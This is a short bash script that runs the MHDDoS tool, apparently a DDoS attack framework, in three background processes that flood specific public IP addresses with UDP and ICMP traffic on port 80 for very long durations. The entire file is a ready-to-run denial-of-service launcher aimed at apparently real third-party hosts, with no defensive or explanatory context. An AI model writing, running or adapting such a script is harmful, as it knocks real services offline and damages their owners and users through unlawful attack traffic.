#!/bin/bash

python3 MHDDoS/start.py UDP 110.42.35.240:80 1 99999999 true &
python3 MHDDoS/start.py UDP 154.9.249.129:80 1 99999999 true &
python3 MHDDoS/start.py ICMP 153.121.71.128:80 1 99999999 true &
